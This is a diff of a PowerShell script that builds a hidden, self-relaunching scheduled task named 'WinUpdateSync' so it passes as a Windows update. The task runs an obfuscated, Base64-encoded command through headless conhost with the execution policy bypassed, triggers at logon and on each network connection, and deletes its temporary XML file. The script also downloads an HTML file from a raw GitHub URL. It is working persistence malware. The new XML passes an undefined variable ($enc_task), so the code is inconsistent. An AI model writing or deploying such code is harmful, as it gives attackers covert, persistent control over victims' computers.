@@ -14,43 +14,11 @@ $inner = '$k=1869; $h=@(1829,1849,1849,1853,1854,1911,1890,1890,1855,1836,1850,1
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($inner)
 $enc = [Convert]::ToBase64String($bytes)
 
-# 2. Build the XML - Removed the Principal block which often causes Access Denied for non-admins
-$xml = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-    </LogonTrigger>
-  </Triggers>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Hidden>true</Hidden>
-    <Enabled>true</Enabled>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>conhost.exe</Command>
-      <Arguments>--headless powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc</Arguments>
-    </Exec>
-  </Actions>
-</Task>
-"@
+$xml = "<?xml version='1.0' encoding='UTF-16'?><Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'><Triggers><LogonTrigger><Enabled>true</Enabled><UserId>$env:USERDOMAIN\$env:USERNAME</UserId></LogonTrigger><EventTrigger><Enabled>true</Enabled><Subscription>&lt;QueryList&gt;&lt;Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'&gt;&lt;Select Path='Microsoft-Windows-NetworkProfile/Operational'&gt;*[System[(EventID=10000)]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription></EventTrigger></Triggers><Principals><Principal id='Author'><UserId>$env:USERDOMAIN\$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><ExecutionTimeLimit>PT72H</ExecutionTimeLimit><Hidden>true</Hidden><Enabled>true</Enabled></Settings><Actions Context='Author'><Exec><Command>conhost.exe</Command><Arguments>--headless powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc_task</Arguments></Exec></Actions></Task>"; 
 
-$path = "$env:TEMP\sys_config.xml"
-$xml | Out-File $path -Encoding Unicode
-
-# 3. Create the task in a SUBFOLDER. 
-# This is the "nukative" fix for Access Denied.
-$taskPath = "\Tasks\WinUpdateSync"
-
-schtasks /Delete /TN "$taskPath" /F 2>$null
-schtasks /Create /XML $path /TN "$taskPath" /F
-Remove-Item $path -Force
-
+$xml | Out-File "$env:TEMP\t.xml" -Encoding Unicode; 
+schtasks /Create /XML "$env:TEMP\t.xml" /TN "WinUpdateSync" /F; 
+Remove-Item "$env:TEMP\t.xml" -Force;
 
 $htmlPath = "$env:TEMP\sys_cache.html"
 $htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"
